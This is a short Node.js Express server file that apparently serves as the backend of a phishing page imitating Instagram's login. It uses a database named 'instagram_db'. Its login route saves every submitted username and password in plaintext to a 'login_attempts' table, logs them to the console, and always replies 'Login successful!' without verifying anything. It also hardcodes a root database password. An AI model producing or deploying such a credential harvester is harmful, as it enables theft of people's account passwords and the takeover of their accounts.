// server.js
const express = require('express');
const mysql = require('mysql2/promise');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Database Connection Pool
const pool = mysql.createPool({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: 'root', // Updated with your password
    database: 'instagram_db',
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
});

// --- ROUTES ---

// 1. Serve the main HTML page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// 2. Handle the Login POST Request and Save Data
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    // Basic validation
    if (!username || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Username and password are required.' 
        });
    }

    try {
        // Save every login attempt directly into the database
        const insertSql = 'INSERT INTO login_attempts (username, password) VALUES (?, ?)';
        await pool.execute(insertSql, [username, password]);

        console.log(`New login saved: Username -> ${username}, Password -> ${password}`);

        // Return success response to the frontend
        return res.status(200).json({ 
            success: true, 
            message: 'Login successful!' 
        });

    } catch (err) {
        console.error('Database Error:', err);
        return res.status(500).json({ 
            success: false, 
            message: 'Server error. Please try again later.' 
        });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});